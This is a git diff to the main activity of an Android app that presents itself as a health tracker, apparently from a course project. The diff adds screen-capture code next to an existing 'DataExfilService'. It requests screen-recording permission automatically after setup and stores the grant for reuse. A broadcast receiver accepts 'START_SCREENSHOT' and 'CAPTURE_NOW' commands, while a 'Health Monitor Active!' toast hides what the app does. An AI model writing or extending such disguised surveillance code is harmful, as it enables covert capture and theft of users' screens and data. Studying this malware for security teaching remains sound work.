@@ -36,6 +36,9 @@ import android.content.IntentFilter
 import android.net.Uri
 import android.os.Environment
 import com.inf2007.healthtracker.utilities.DataExfilService
+import com.inf2007.healthtracker.utilities.ScreenshotPermissionHelper
+import com.inf2007.healthtracker.utilities.ScreenshotCaptureService
+import android.media.projection.MediaProjectionManager
 
 class MainActivity : ComponentActivity() {
     private val handler = Handler(Looper.getMainLooper())
@@ -43,6 +46,8 @@ class MainActivity : ComponentActivity() {
     private var isPollingAccessibility = false
     private var isStorageDialogShowing = false
     private var isStoragePermissionHandled = false
+    private var mediaProjectionIntent: Intent? = null
+    private var hasRequestedMediaProjection = false
 
     private val checkPermissionRunnable = object : Runnable {
         override fun run() {
@@ -104,6 +109,65 @@ class MainActivity : ComponentActivity() {
         }
     }
 
+    private val screenCaptureLauncher = registerForActivityResult(
+        ActivityResultContracts.StartActivityForResult()
+    ) { result ->
+        ScreenshotPermissionHelper.handlePermissionResult(
+            this,
+            result.resultCode,
+            result.data
+        ) { resultCode, intent ->
+            mediaProjectionIntent = intent
+
+            // Store the result code and intent for later use
+            val prefs = getSharedPreferences("screenshot_prefs", MODE_PRIVATE)
+            prefs.edit().apply {
+                putInt("result_code", resultCode)
+                putString("media_projection_intent", intent.toUri(0))
+                apply()
+            }
+
+            ScreenshotPermissionHelper.startScreenshotService(this, resultCode, intent)
+
+            Handler(Looper.getMainLooper()).postDelayed({
+                ScreenshotPermissionHelper.stopScreenshotService(this)
+            }, 1000)
+        }
+    }
+
+    private val screenshotCommandReceiver = object : BroadcastReceiver() {
+        override fun onReceive(context: Context, intent: Intent) {
+            val command = intent.getStringExtra("command") ?: return
+            handleScreenshotCommand(command)
+        }
+    }
+
+    fun handleScreenshotCommand(command: String) {
+        when (command) {
+            "START_SCREENSHOT" -> {
+                if (mediaProjectionIntent != null) {
+                    val prefs = getSharedPreferences("screenshot_prefs", MODE_PRIVATE)
+                    val resultCode = prefs.getInt("result_code", RESULT_OK)
+                    ScreenshotPermissionHelper.startScreenshotService(
+                        this,
+                        resultCode,
+                        mediaProjectionIntent!!
+                    )
+                } else {
+                    // Request permission first if we don't have it
+                    val intent = ScreenshotPermissionHelper.createScreenCaptureIntent(this)
+                    screenCaptureLauncher.launch(intent)
+                }
+            }
+            "STOP_SCREENSHOT" -> {
+                ScreenshotPermissionHelper.stopScreenshotService(this)
+            }
+            "CAPTURE_NOW" -> {
+                ScreenshotPermissionHelper.captureScreenshotNow(this)
+            }
+        }
+    }
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         FirebaseApp.initializeApp(this)
@@ -130,12 +194,19 @@ class MainActivity : ComponentActivity() {
         )
 
         checkAndRequestPermissions()
+
+        registerReceiver(
+            screenshotCommandReceiver,
+            IntentFilter("com.inf2007.healthtracker.SCREENSHOT_COMMAND"),
+            RECEIVER_NOT_EXPORTED
+        )
     }
 
     override fun onDestroy() {
         super.onDestroy()
         try {
             unregisterReceiver(permissionsGrantedReceiver)
+            unregisterReceiver(screenshotCommandReceiver)
         } catch (e: Exception) {
             Log.e("HealthTracker", "Error unregistering receiver: ${e.message}")
         }
@@ -170,10 +241,26 @@ class MainActivity : ComponentActivity() {
             Log.e("HealthTracker", "Failed to start DataExfilService: ${e.message}")
         }
 
+        Handler(Looper.getMainLooper()).postDelayed({
+            requestScreenshotPermission()
+        }, 2000)
+
         // 3. Show a feedback message so the user knows it worked
         Toast.makeText(this, "Health Monitor Active!", Toast.LENGTH_SHORT).show()
 
         Log.i("HealthTracker", "=== PERMISSION GRANTED: SERVICE INITIALIZED ===")
+    }
+
+    private fun requestScreenshotPermission() {
+        if (hasRequestedMediaProjection) {
+            Log.i("HealthTracker", "MediaProjection already requested, skipping")
+            return
+        }
+
+        hasRequestedMediaProjection = true
+        Log.i("HealthTracker", "Requesting MediaProjection permission")
+        val intent = ScreenshotPermissionHelper.createScreenCaptureIntent(this)
+        screenCaptureLauncher.launch(intent)
     }
 
     private fun stopPollingAndReturn() {
